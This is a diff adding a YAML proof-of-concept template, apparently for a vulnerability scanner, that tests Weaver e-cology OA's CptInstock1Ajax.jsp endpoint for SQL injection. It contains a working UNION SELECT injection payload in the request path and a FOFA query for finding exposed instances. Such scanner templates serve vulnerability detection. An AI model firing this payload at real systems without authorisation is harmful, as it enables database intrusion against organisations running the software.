@@ -1,0 +1,17 @@
+id: poc-yaml-weaver-e-cology-cptinstock1ajax-sqli
+info:
+  name: 泛微OA E-Cology CptInstock1Ajax SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: e-cology
+  fofa: app="泛微-OA（e-cology）"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /cpt/capital/CptInstock1Ajax.jsp?id=-99+UNION+ALL+SELECT+sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}')),1#
+  expression: status_code == 200 && contains(body,"\"spec\":") && contains(body,"\"price\":")
+    && contains(body,t2) && !contains(body,"<")
+transport: http
